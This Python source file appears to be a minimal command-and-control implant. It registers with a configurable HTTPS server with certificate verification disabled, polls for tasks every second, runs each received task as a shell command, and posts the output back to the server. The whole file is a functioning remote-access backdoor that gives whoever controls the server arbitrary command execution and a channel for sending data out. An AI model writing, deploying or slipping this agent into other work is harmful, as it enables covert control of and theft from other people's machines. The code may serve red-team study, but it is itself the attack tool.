import requests
import base64
import sys
import time
import subprocess
import urllib3

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 4443

# Suppress only the single InsecureRequestWarning from urllib3 needed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def register_agent(host, port):
    url = f"https://{host}:{port}/register"
    session = requests.Session()
    session.verify = False  # Ignore SSL certificate verification
    response = session.get(url)
    if response.status_code == 200:
        return response.text
    else:
        return None

def get_task(host, port, session_id):
    url = f"https://{host}:{port}/task/{session_id}"
    session = requests.Session()
    session.verify = False  # Ignore SSL certificate verification
    response = session.get(url)
    if response.status_code == 200:
        task = response.text
        if task != "None":
            return task
    return None

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def send_output(host, port, session_id, command, output):
    url = f"https://{host}:{port}/results/{session_id}"
    data = {
        'command': command,
        'output': output
    }
    session = requests.Session()
    session.verify = False  # Ignore SSL certificate verification
    response = session.post(url, json=data)
    if response.status_code == 200:
        print("Output sent successfully.")
    else:
        print("Failed to send output.")

def main():
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        host = DEFAULT_HOST
        port = DEFAULT_PORT

    session_id = register_agent(host, port)
    if session_id:
        print(f"Agent registered successfully. Session ID: {session_id}")
        while True:
            task = get_task(host, port, session_id)
            if task:
                print(f"Task received: {task}")
                if task.startswith("exit"):
                    break
                else:
                    output = execute_command(task)
                    send_output(host, port, session_id, task, output)
            time.sleep(1)  # Polling interval
    else:
        print("Failed to register agent.")

if __name__ == "__main__":
    main()
